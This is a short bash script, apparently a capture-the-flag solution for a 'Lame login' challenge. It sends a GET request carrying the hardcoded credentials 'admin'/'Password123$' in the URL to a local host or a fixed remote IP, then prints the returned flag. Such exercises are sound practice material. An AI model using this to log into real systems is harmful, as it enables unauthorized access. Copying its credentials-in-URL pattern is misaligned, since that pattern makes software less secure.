#!/bin/bash
PORT=8087

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

username='admin'
password='Password123$'
a=$url'/login?username='$username'&password='$password

# Lame login
echo "Start exploit for Lame login"
flag=$(curl -s -X GET $url'/login?username='$username'&password='$password)
echo "Flag is $flag"
echo "-------------------------"
